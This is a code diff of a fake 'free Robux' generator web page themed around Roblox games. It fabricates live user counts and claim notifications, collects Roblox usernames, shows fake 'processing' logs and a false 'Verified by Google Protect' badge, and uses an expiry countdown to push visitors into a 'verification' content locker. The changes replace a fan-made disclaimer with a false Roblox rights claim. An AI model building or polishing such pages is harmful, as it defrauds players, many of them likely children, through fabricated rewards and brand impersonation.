+          ["🎄", "Festive 67", "Limited"], ["🍬", "Los Candies", "Limited"], ["🧟", "Headless Horseman", "Mythic"],
+          ["🐋", "Capitano Moby", "Mythic"], ["💰", "$1000000", "VIP"], ["⚡", "Admin Commands", "VIP"]
+        ]
+      }
     };
+
     function buildCollectorUI(mode) {
       const config = collectorItems[mode];
       const container = document.getElementById('collectorContainer');
       container.className = `collector-app ${config.theme}`;
-      container.innerHTML = `<div class="collector-shell"><div class="collector-header"><div class="collector-logo">${config.logo}</div><h1>${config.title}</h1><p>${config.subtitle}</p><div class="active-strip"><span>🌊 ACTIVE USERS</span><strong id="collectorActiveCount">${Math.floor(Math.random() * 800 + 200)}</strong></div></div><div class="select-line">⚡ SELECT YOUR REWARD ⚡</div><div class="item-grid" id="collectorGrid"></div></div><div class="collector-toast-wrap" id="collectorToastWrap"></div>`;
+      container.innerHTML = `
+        <div class="collector-shell">
+          <div class="collector-header">
+            <div class="collector-logo">${config.logo}</div>
+            <h1>${config.title}</h1>
+            <p>${config.subtitle}</p>
+            <div class="active-strip"><span>🌊 ACTIVE USERS</span><strong id="collectorActiveCount">${Math.floor(Math.random() * 800 + 200)}</strong></div>
+          </div>
+          <div class="select-line">⚡ SELECT YOUR REWARD ⚡</div>
+          <div class="item-grid" id="collectorGrid"></div>
+        </div>
+        <div class="collector-toast-wrap" id="collectorToastWrap"></div>
+        <div class="footer-legal">All rights reserved to Roblox, 2026</div>
+      `;
       const grid = document.getElementById('collectorGrid');
-      grid.innerHTML = config.items.map(([icon, name, rarity]) => `<button class="loot-card" data-name="${name}" data-icon="${icon}" data-rarity="${rarity}"><div class="loot-art">${icon}</div><div class="loot-name">${name}</div><div class="rarity">${rarity}</div></button>`).join('');
-      document.querySelectorAll('.loot-card').forEach(card => card.addEventListener('click', () => openCollectorModal({ icon: card.dataset.icon, name: card.dataset.name, rarity: card.dataset.rarity })));
-      setInterval(() => { const el = document.getElementById('collectorActiveCount'); if (el) el.innerText = Math.floor(Math.random() * 800 + 200); }, 4500);
+      grid.innerHTML = config.items.map(([icon, name, rarity]) => `
+        <button class="loot-card" data-name="${name}" data-icon="${icon}" data-rarity="${rarity}">
+          <div class="loot-art">${icon}</div>
+          <div class="loot-name">${name}</div>
+          <div class="rarity">${rarity}</div>
+        </button>
+      `).join('');
+      document.querySelectorAll('.loot-card').forEach(card => {
+        card.addEventListener('click', () => openCollectorModal({
+          icon: card.dataset.icon,
+          name: card.dataset.name,
+          rarity: card.dataset.rarity
+        }));
+      });
+      // active users randomizer
+      setInterval(() => {
+        const el = document.getElementById('collectorActiveCount');
+        if (el) el.innerText = Math.floor(Math.random() * 800 + 200);
+      }, 4500);
+      // random claim notifications
       const usernames = ['MADELYN2', 'zontir99', 'marcos10', 'Queen_lisa1', 'LANA11', 'tbonmk2'];
       const avatars = ['https://randomuser.me/api/portraits/women/1.jpg', 'https://randomuser.me/api/portraits/men/2.jpg', 'https://randomuser.me/api/portraits/men/3.jpg'];
       setInterval(() => {
@@ -708,10 +446,22 @@
         setTimeout(() => toast.remove(), 4000);
       }, 5500);
     }
+
     function openCollectorModal(item) {
       let modal = document.getElementById('collectorModal');
       if (!modal) { modal = document.createElement('div'); modal.id = 'collectorModal'; modal.className = 'item-modal'; document.body.appendChild(modal); }
-      modal.innerHTML = `<div class="item-dialog"><div class="modal-art">${item.icon}</div><h2>${item.name}</h2><p>Would you like to get this ${item.rarity} reward?</p><input id="collectorUsername" type="text" placeholder="Enter your Roblox username" autocomplete="nickname"><div class="dialog-actions"><button class="small-btn cancel" id="collectorCancel">Cancel</button><button class="small-btn continue" id="collectorContinue">Continue</button></div></div>`;
+      modal.innerHTML = `
+        <div class="item-dialog">
+          <div class="modal-art">${item.icon}</div>
+          <h2>${item.name}</h2>
+          <p>Would you like to get this ${item.rarity} reward?</p>
+          <input id="collectorUsername" type="text" placeholder="Enter your Roblox username">
+          <div class="dialog-actions">
+            <button class="small-btn cancel" id="collectorCancel">Cancel</button>
+            <button class="small-btn continue" id="collectorContinue">Continue</button>
+          </div>
+        </div>
+      `;
       modal.classList.add('visible');
       document.getElementById('collectorCancel').onclick = () => modal.classList.remove('visible');
       document.getElementById('collectorContinue').onclick = () => {
@@ -721,43 +471,70 @@
         setTimeout(() => showCollectorSuccess(modal, username, item), 1500);
       };
     }
-    function showCollectorLoading(modal, text) { modal.querySelector('.item-dialog').innerHTML = `<div class="loader-stack" style="text-align:center"><div class="loader-ring"></div><h3>${text}</h3><p>Please wait...</p></div>`; }
+
+    function showCollectorLoading(modal, text) {
+      modal.querySelector('.item-dialog').innerHTML = `<div class="loader-stack" style="text-align:center"><div class="loader-ring"></div><h3>${text}</h3><p>Please wait...</p></div>`;
+    }
+
     function showCollectorSuccess(modal, username, item) {
-      modal.querySelector('.item-dialog').innerHTML = `<div class="modal-art">${item.icon}</div><h2>@${username}</h2><p>${item.name} is ready to transfer.</p><button class="primary-btn" id="collectorTransferBtn" style="margin-top:16px">Continue</button>`;
+      modal.querySelector('.item-dialog').innerHTML = `
+        <div class="modal-art">${item.icon}</div>
+        <h2>@${username}</h2>
+        <p>${item.name} is ready to transfer.</p>
+        <button class="primary-btn" id="collectorTransferBtn" style="margin-top:16px">Continue</button>
+      `;
       document.getElementById('collectorTransferBtn').onclick = () => {
         showCollectorLoading(modal, `Transferring ${item.name} to @${username}`);
         setTimeout(() => {
-          modal.querySelector('.item-dialog').innerHTML = `<div class="final-card"><div class="modal-art">${item.icon}</div><h2>${item.name} Generated!</h2><p>Final verification is required to unlock the reward page.</p><button class="primary-btn pulse" id="collectorFinalBtn">NEXT 🎁</button></div>`;
+          modal.querySelector('.item-dialog').innerHTML = `
+            <div class="final-card">
+              <div class="modal-art">${item.icon}</div>
+              <h2>${item.name} Generated!</h2>
+              <p>Final verification is required to unlock the reward page.</p>
+              <button class="primary-btn pulse" id="collectorFinalBtn">NEXT 🎁</button>
+            </div>
+          `;
           document.getElementById('collectorFinalBtn').onclick = () => { modal.classList.remove('visible'); triggerContentLocker(); };
         }, 1300);
       };
     }
+
     function enterCollector(mode) {
       document.getElementById('landingScreen').classList.add('is-hidden');
       document.getElementById('generatedApp').classList.add('hidden');
-      document.getElementById('collectorContainer').classList.remove('hidden');
+      const container = document.getElementById('collectorContainer');
+      container.classList.remove('hidden');
       buildCollectorUI(mode);
       document.body.classList.remove('landing-active');
+      const backBtn = document.getElementById('globalBackArrow');
+      backBtn.style.display = 'flex';
       window.scrollTo({ top: 0 });
     }
 
-    // RBX flow with side-by-side cards on mobile, dynamic avatar & details
+    // ----- RBX flow with improved footer and back arrow -----
     function enterRBX() {
       document.getElementById('landingScreen').classList.add('is-hidden');
       document.getElementById('collectorContainer').classList.add('hidden');
       const rbxApp = document.getElementById('generatedApp');
       rbxApp.classList.remove('hidden');
+      document.body.classList.remove('landing-active');
+      const backBtn = document.getElementById('globalBackArrow');
+      backBtn.style.display = 'flex';
+
       if (!window._rbxLoaded) {
         window._rbxLoaded = true;
-        rbxApp.innerHTML = `<div class="brand"><div class="brand-mark"><svg class="brand-logo" viewBox="0 0 520 160"><use href="#logoIcon"></use></svg><span class="year">2026</span></div><div><h1>MEORBX BOOSTER</h1><p class="subhead">The latest updated online tool for Roblox</p></div></div>
-        <section class="metrics"><div class="live"><span><i class="dot"></i> LIVE TODAY</span></div><h2>People Who Claimed Today</h2><div class="metric-grid"><div class="metric-card"><svg class="icon gold-icon" viewBox="0 0 128 128"><use href="#coinIcon"></use></svg><div class="metric-value" id="coinUsers">8,547</div><div class="metric-name">Robux Claimed</div></div><div class="metric-card"><svg class="icon blue-icon" viewBox="0 0 128 128"><use href="#diamondIcon"></use></svg><div class="metric-value" id="gemUsers">6,923</div><div class="metric-name">Diamonds Claimed</div></div></div></section>
-        <section class="panel" id="phase0"><h2>Choose Your Reward Type</h2><div class="reward-grid"><button class="choice" data-type="robux"><svg class="icon gold-icon" viewBox="0 0 128 128"><use href="#coinIcon"></use></svg><div class="choice-title">💰 ROBUX</div><span class="select-pill">SELECT</span></button><button class="choice" data-type="diamond"><svg class="icon blue-icon" viewBox="0 0 128 128"><use href="#diamondIcon"></use></svg><div class="choice-title">💎 DIAMOND</div><span class="select-pill">SELECT</span></button></div></section>
-        <section class="panel hidden" id="phase1"><h2>Enter Your Roblox Username</h2><div class="username-section"><div class="input-wrap"><span>@</span><input id="userInput" type="text" placeholder="Your Roblox Username" autocomplete="off"></div><button class="primary-btn" id="lookupBtn">🔍 SEARCH USER</button><div class="alert" id="alertBox"></div><div class="account" id="accountCard"><div class="profile"><div class="roblox-avatar" id="robloxAvatar">👤</div><div class="user-info"><h3 id="fullName">Player</h3><p id="userHandle">@player</p></div></div><div class="details-grid"><div class="detail-card"><div class="detail-label">📅 CREATED</div><div class="detail-value" id="joinDate">Jan 12, 2023</div></div><div class="detail-card"><div class="detail-label">📶 STATUS</div><div class="detail-value"><span id="statusBadge" class="status-online">● ONLINE</span></div></div><div class="detail-card"><div class="detail-label">🛡 ACCOUNT</div><div class="detail-value"><span class="badge-active">✓ ACTIVE</span></div></div></div><button class="primary-btn" id="continueBtn" style="margin-top:20px">CONTINUE →</button></div></div></section>
-        <section class="panel hidden" id="phase2"><h2>Select Robux Amount</h2><div class="amount-grid" id="robuxChoices"><button class="amount" data-kind="robux" data-amount="800"><div class="amount-number">800</div><div class="available">AVAILABLE</div></button><button class="amount" data-kind="robux" data-amount="5800"><div class="amount-number">5,800</div><div class="available">AVAILABLE</div></button><button class="amount" data-kind="robux" data-amount="25000"><div class="amount-number">25,000</div><div class="available">AVAILABLE</div></button><button class="amount" data-kind="robux" data-amount="100000"><div class="amount-number">100,000</div><div class="available">AVAILABLE</div></button></div></section>
-        <section class="panel hidden" id="phase2_5"><h2>Select Diamond Amount</h2><div class="amount-grid"><button class="amount" data-kind="diamond" data-amount="100"><div class="amount-number">100</div><div class="available">AVAILABLE</div></button><button class="amount" data-kind="diamond" data-amount="250"><div class="amount-number">250</div><div class="available">AVAILABLE</div></button><button class="amount" data-kind="diamond" data-amount="700"><div class="amount-number">700</div><div class="available">AVAILABLE</div></button><button class="amount" data-kind="diamond" data-amount="7000"><div class="amount-number">7,000</div><div class="available">AVAILABLE</div></button></div></section>
-        <section class="panel hidden" id="phase3"><h2>Processing Request</h2><div class="showcase"><span id="rewardIcon"><svg class="icon" viewBox="0 0 128 128"><use href="#coinIcon"></use></svg></span><div><div class="reward-number" id="rewardNumber">0</div><div class="reward-type" id="rewardType">Generating</div></div></div><div class="progress-row"><span>⚙ Processing request...</span><strong id="taskPercent">0%</strong></div><div class="bar"><span id="taskBar"></span></div><div class="logs" id="taskLogs"><div>✓ Connecting to servers...</div></div><p class="subhead" style="text-align:center">User: <strong id="userShow">Username</strong></p></section>
-        <section class="panel hidden" id="phase4"><div id="checkSection"><h2>Verified by Google Protect</h2><div class="ready-icon" id="readyIcon"><svg class="icon" viewBox="0 0 128 128"><use href="#coinIcon"></use></svg></div><div style="text-align:center"><p id="prizeShow" style="font-weight:800"></p><p class="subhead">User: <strong id="userShow2">Username</strong></p></div><div class="info-box"><div>ℹ Your rewards are ready to be added</div><div>⚠ Click NEXT for the final step</div></div><button class="primary-btn pulse" id="claimBtn">🎁 NEXT</button></div><div id="doneSection" class="hidden"><h2 style="color:var(--emerald)">Generated Successfully!</h2><div class="success"><div id="completePrize"></div><p>Generated for <span id="userShow3">Username</span></p></div><div class="notice">Verification is required to unlock the reward page.</div><button class="primary-btn pulse" id="lockerBtn" onclick="triggerContentLocker()" style="background:var(--emerald)">NEXT 🎁</button><p class="subhead" style="text-align:center;margin-top:14px">This offer expires in <span id="timer">05:00</span></p></div></section>
-        <footer class="footer"><p>Fan-made demo. Roblox, Robux are trademarks of Roblox Corporation.</p></footer>`;
+        rbxApp.innerHTML = `
+          <div class="brand"><div class="brand-mark"><svg class="brand-logo" viewBox="0 0 520 160"><use href="#logoIcon"></use></svg><span class="year">2026</span></div><div><h1>MEORBX BOOSTER</h1><p class="subhead">The latest updated online tool for Roblox</p></div></div>
+          <section class="metrics"><div class="live"><span><i class="dot"></i> LIVE TODAY</span></div><h2>People Who Claimed Today</h2><div class="metric-grid"><div class="metric-card"><svg class="icon gold-icon" viewBox="0 0 128 128"><use href="#coinIcon"></use></svg><div class="metric-value" id="coinUsers">8,547</div><div class="metric-name">Robux Claimed</div></div><div class="metric-card"><svg class="icon blue-icon" viewBox="0 0 128 128"><use href="#diamondIcon"></use></svg><div class="metric-value" id="gemUsers">6,923</div><div class="metric-name">Diamonds Claimed</div></div></div></section>
+          <section class="panel" id="phase0"><h2>Choose Your Reward Type</h2><div class="reward-grid"><button class="choice" data-type="robux"><svg class="icon gold-icon" viewBox="0 0 128 128"><use href="#coinIcon"></use></svg><div class="choice-title">💰 ROBUX</div><span class="select-pill">SELECT</span></button><button class="choice" data-type="diamond"><svg class="icon blue-icon" viewBox="0 0 128 128"><use href="#diamondIcon"></use></svg><div class="choice-title">💎 DIAMOND</div><span class="select-pill">SELECT</span></button></div></section>
+          <section class="panel hidden" id="phase1"><h2>Enter Your Roblox Username</h2><div class="username-section"><div class="input-wrap"><span>@</span><input id="userInput" type="text" placeholder="Your Roblox Username" autocomplete="off"></div><button class="primary-btn" id="lookupBtn">🔍 SEARCH USER</button><div class="alert" id="alertBox"></div><div class="account" id="accountCard"><div class="profile"><div class="roblox-avatar" id="robloxAvatar">👤</div><div class="user-info"><h3 id="fullName">Player</h3><p id="userHandle">@player</p></div></div><div class="details-grid"><div class="detail-card"><div class="detail-label">📅 CREATED</div><div class="detail-value" id="joinDate">Jan 12, 2023</div></div><div class="detail-card"><div class="detail-label">📶 STATUS</div><div class="detail-value"><span id="statusBadge" class="status-online">● ONLINE</span></div></div><div class="detail-card"><div class="detail-label">🛡 ACCOUNT</div><div class="detail-value"><span class="badge-active">✓ ACTIVE</span></div></div></div><button class="primary-btn" id="continueBtn" style="margin-top:20px">CONTINUE →</button></div></div></section>
+          <section class="panel hidden" id="phase2"><h2>Select Robux Amount</h2><div class="amount-grid"><button class="amount" data-kind="robux" data-amount="800"><div class="amount-number">800</div><div class="available">AVAILABLE</div></button><button class="amount" data-kind="robux" data-amount="5800"><div class="amount-number">5,800</div><div class="available">AVAILABLE</div></button><button class="amount" data-kind="robux" data-amount="25000"><div class="amount-number">25,000</div><div class="available">AVAILABLE</div></button><button class="amount" data-kind="robux" data-amount="100000"><div class="amount-number">100,000</div><div class="available">AVAILABLE</div></button></div></section>
+          <section class="panel hidden" id="phase2_5"><h2>Select Diamond Amount</h2><div class="amount-grid"><button class="amount" data-kind="diamond" data-amount="100"><div class="amount-number">100</div><div class="available">AVAILABLE</div></button><button class="amount" data-kind="diamond" data-amount="250"><div class="amount-number">250</div><div class="available">AVAILABLE</div></button><button class="amount" data-kind="diamond" data-amount="700"><div class="amount-number">700</div><div class="available">AVAILABLE</div></button><button class="amount" data-kind="diamond" data-amount="7000"><div class="amount-number">7,000</div><div class="available">AVAILABLE</div></button></div></section>
+          <section class="panel hidden" id="phase3"><h2>Processing Request</h2><div class="showcase"><span id="rewardIcon"><svg class="icon" viewBox="0 0 128 128"><use href="#coinIcon"></use></svg></span><div><div class="reward-number" id="rewardNumber">0</div><div class="reward-type" id="rewardType">Generating</div></div></div><div class="progress-row"><span>⚙ Processing request...</span><strong id="taskPercent">0%</strong></div><div class="bar"><span id="taskBar"></span></div><div class="logs" id="taskLogs"><div>✓ Connecting to servers...</div></div><p class="subhead" style="text-align:center">User: <strong id="userShow">Username</strong></p></section>
+          <section class="panel hidden" id="phase4"><div id="checkSection"><h2>Verified by Google Protect</h2><div class="ready-icon" id="readyIcon"><svg class="icon" viewBox="0 0 128 128"><use href="#coinIcon"></use></svg></div><div style="text-align:center"><p id="prizeShow" style="font-weight:800"></p><p class="subhead">User: <strong id="userShow2">Username</strong></p></div><div class="info-box"><div>ℹ Your rewards are ready to be added</div><div>⚠ Click NEXT for the final step</div></div><button class="primary-btn pulse" id="claimBtn">🎁 NEXT</button></div><div id="doneSection" class="hidden"><h2 style="color:var(--emerald)">Generated Successfully!</h2><div class="success"><div id="completePrize"></div><p>Generated for <span id="userShow3">Username</span></p></div><div class="notice">Verification is required to unlock the reward page.</div><button class="primary-btn pulse" id="lockerBtn" onclick="triggerContentLocker()" style="background:var(--emerald)">NEXT 🎁</button><p class="subhead" style="text-align:center;margin-top:14px">This offer expires in <span id="timer">05:00</span></p></div></section>
+          <div class="footer-legal">All rights reserved to Roblox, 2026</div>
+        `;
+        // reattach events
         const phases = ["phase0","phase1","phase2","phase2_5","phase3","phase4"].map(id => document.getElementById(id));
         function showPhase(id){ phases.forEach(p => p?.classList.toggle('hidden', p.id !== id)); }
         let state = { type: "", amount: 0, user: "" };
@@ -768,27 +545,27 @@
         function runProgress(){ showPhase("phase3"); let p=0; const interval = setInterval(()=>{ p+=7; document.getElementById("taskBar").style.width=p+"%"; document.getElementById("taskPercent").innerText=p+"%"; if(p>=100){ clearInterval(interval); setTimeout(()=>{ document.getElementById("readyIcon").innerHTML = `<svg class="icon" viewBox="0 0 128 128"><use href="${state.type==="diamond"?"#diamondIcon":"#coinIcon"}"></use></svg>`; document.getElementById("prizeShow").innerText = `${state.amount.toLocaleString()} ${state.type==="diamond"?"Diamonds are":"Robux are"} ready!`; showPhase("phase4"); },500); } }, 65); }
         document.getElementById("claimBtn").onclick = () => { document.getElementById("checkSection").classList.add("hidden"); document.getElementById("doneSection").classList.remove("hidden"); let t=300, intv=setInterval(()=>{ if(t<=0)clearInterval(intv); let m=Math.floor(t/60), s=t%60; document.getElementById("timer").innerText=`${m.toString().padStart(2,"0")}:${s.toString().padStart(2,"0")}`; t--; },1000); };
       }
-      document.body.classList.remove('landing-active');
       window.scrollTo({ top: 0 });
     }
 
-    document.querySelectorAll('.landing-btn').forEach(btn => {
-      btn.addEventListener('click', () => {
-        const entry = btn.dataset.entry;
-        showLandingToast(entry === 'rbx' ? 'Loading RBX...' : (entry === 'brainrot' ? 'Stealing a Brainrot...' : 'Escaping Tsunami...'));
-        setTimeout(() => {
-          if (entry === 'rbx') enterRBX();
-          else if (entry === 'brainrot') enterCollector('brainrot');
-          else if (entry === 'tsunami') enterCollector('tsunami');
-        }, 500);
+    // attach landing card events
+    document.querySelectorAll('.action-card').forEach(card => {
+      card.addEventListener('click', (e) => {
+        const entry = card.dataset.entry;
+        if (entry === 'rbx') enterRBX();
+        else if (entry === 'brainrot') enterCollector('brainrot');
+        else if (entry === 'tsunami') enterCollector('tsunami');
       });
     });
+
+    // initialize back arrow functionality
+    attachBackArrow();
   </script>
+
   <svg style="display:none"><defs><linearGradient id="logoGradient"><stop stop-color="#7c3aed"/><stop offset="1" stop-color="#10b981"/></linearGradient><radialGradient id="coinGradient"><stop stop-color="#fff7ad"/><stop offset=".45" stop-color="#fbbf24"/><stop offset="1" stop-color="#b45309"/></radialGradient><linearGradient id="diamondGradient"><stop stop-color="#cffafe"/><stop offset=".45" stop-color="#60a5fa"/><stop offset="1" stop-color="#2563eb"/></linearGradient></defs>
     <symbol id="logoIcon" viewBox="0 0 520 160"><rect x="20" y="26" width="120" height="108" rx="28" fill="url(#logoGradient)"/><rect x="60" y="66" width="40" height="40" rx="8" fill="#fff" transform="rotate(15 80 86)"/><text x="164" y="78" fill="#232527" font-family="Montserrat" font-size="46" font-weight="900">MEORBX</text><text x="166" y="116" fill="#9333ea" font-family="Montserrat" font-size="30" font-weight="800">BOOSTER</text></symbol>
     <symbol id="coinIcon" viewBox="0 0 128 128"><circle cx="64" cy="64" r="56" fill="url(#coinGradient)"/><circle cx="64" cy="64" r="43" fill="none" stroke="#fff3b0" stroke-width="8"/><rect x="47" y="47" width="34" height="34" rx="7" fill="#fffdf0" transform="rotate(18 64 64)"/><circle cx="64" cy="64" r="8" fill="#d97706"/></symbol>
     <symbol id="diamondIcon" viewBox="0 0 128 128"><path d="M24 38 42 18h44l18 20-40 72Z" fill="url(#diamondGradient)"/><path d="M24 38h80M42 18l22 92M86 18 64 110M42 18 54 38 64 18 74 38 86 18" fill="none" stroke="#eff6ff" stroke-width="5"/></symbol>
-    <symbol id="avatarIcon" viewBox="0 0 160 160"><rect width="160" height="160" rx="80" fill="#ede9fe"/><circle cx="80" cy="62" r="30" fill="#9333ea"/><path d="M34 142c7-31 25-47 46-47s39 16 46 47" fill="#10b981"/><circle cx="68" cy="58" r="5" fill="#fff"/><circle cx="92" cy="58" r="5" fill="#fff"/></symbol>
   </svg>
 </body>
 </html>
